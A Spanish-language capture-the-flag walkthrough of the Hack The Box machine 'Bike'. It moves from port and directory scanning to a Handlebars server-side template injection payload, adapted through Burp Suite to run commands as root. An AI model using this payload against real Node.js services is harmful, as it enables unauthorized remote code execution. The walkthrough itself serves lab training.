1. **Escaneamos todos los puertos (0-65535) con los scripts predeterminados y averiguando los servicios que corren. El `-v` es para que me vaya diciendo a tiempo real lo que va encontrando.**
```bash
nmap -sVC -p- -v [target IP]
```
--> 22/tcp - open - ssh - OpenSSH 8.2p1 Ubuntu 4ubuntu0.4
--> 80/tcp - open - http - Node.js (Express middleware)

2. **Entramos desde el navegador a la IP y añadimos el dominio `bike.htb` junto a su IP a nuestro archivo `/etc/hosts`.**

3. **Usamos la herramienta [[Nikto]] para escanear posibles vulnerabilidades web.**
```bash
nikto -h http://bike.htb
```
Nos devuelve información varia. Nos dice que ha encontrado 19 errores y 5 items reportados en el host remoto.
--> Retrieved x-powered-by header: Express
--> Allowed HTTP Methods: GET, HEAD, POST

4. **Entramos en el sitio web y comprobamos que usa la tecnología Express como web framework y web server con la extensión [[Wappalyzer]]. También vemos que usa el lenguaje de programación Node.js**

5. **Vamos a enumerar directorios y subdirectorios con Gobuster.**
```bash
gobuster dir -u http://bike.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
--> No encontramos nada importante

6. **Volvemos a la web y vemos que hay una línea donde podemos escribir nuestro email. Ponemos uno de ejemplo, como ejemplo@gmail.com y vemos que abajo del input nos sale "We will contact you at: ejemplo@gmail.com".**

7. **Como usa Node.js, sabemos que trabaja con plantillas, por lo que podemos explotar la vulnerabilidad SSTI (Server-Side Template Injection).**
Para ello, podemos recurrir a la página de HackTricks, donde hay manuales sobre un montón de explotaciones de vulnerabilidades.
Buscamos en Google SSTI payloads y entramos en la página de HackTricks.
Encontramos algunos payloads como `{{7*7}}`. Lo introducimos en la línea donde introducimos el email y nos redirige a una página de error donde aparecen rutas importantes.

Una de esas rutas importantes es `/root/Backend/node_modules/handlebars/...`, por lo que vemos que usa el motor de plantillas `Handlebars`. Volvemos a la misma página de los payloads para SSTI de HackTricks y buscamos `Handlebars`, donde encontraremos payloads específicos para eso:
```java
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

8. **Abrimos BurpSuite, recargamos la página para que se vuelva a enviar el `{{7*7}}`, volvemos a BurpSuite, nos vamos a Proxy, dentro de Proxy a HTTP history, entramos en la petición y la mandamos al Repeater**


9. **Ahora vamos a encodear el payload a URL. Para ello, vamos a la pestaña Decoder dentro de BurpSuite. Pegamos el payload y le damos a Encode as URL. Obtenemos el payload encodeado y lo copiamos.**
Esto sirve para que el servidor interprete todos los caracteres sin problemas.

10. **Volvemos al Repeater y sustituimos el valor de `email` por el payload encodeado y le damos a Send.**
--> Volvemos a obtener un error, pero esta vez nos dice `require is not defined`. Comprobamos que `require` es parte de nuestro payload, por lo que el servidor lo ha interpretado y ejecutado.

11. **Para que no nos de error, vamos a cambiar el payload. Volvemos al Decoder y cambiamos la linea de `{{this.push "return require('child_process').exec('whoami');"}}` por `{{this.push "return process"}}`. Lo encodeamos como URL y lo copiamos.**

12. **Volvemos al Repeater, olvemos a sustituir el contenido de `email` por el nuevo payload y lo enviamos.**
--> Ya no obtenemos ningún error, sino que obtenemos la respuesta, por lo que nos damos cuenta que podemos hacer las solicitudes que queramos con el objeto `process`.

13. **Vamos a la documentación oficial de Node.js para buscar qué podemos pedir con el objeto `process` y encontramos que podemos obtener el `process.mainModule`, que sustituye a `require.main`, por lo que podemos ejecutar ya el payload original que obtuvimos de la página HackTricks (modificando algunas cosas)**
--> Cambiamos en el Decoder de nuevo nuestro payload y la línea `{{this.push "return process"}}`, la cambiamos por `{{this.push "return process.mainModule.require('child_process').execSync('whoami');"}}`. 
Lo encodeamos en URL, lo enviamos y obtenemos la respuesta `root`, por lo que se ha ejecutado el comando `whoami`.

A partir de aquí, ya podemos mandar una reverse-shell o seguir ejecutando código como lo hemos estado haciendo hasta ahora, sustituyendo `whoami` por los comandos que queramos ejecutar.
En el directorio `/root` se encuentra la flag.
--> **MACHINE PWNED!**
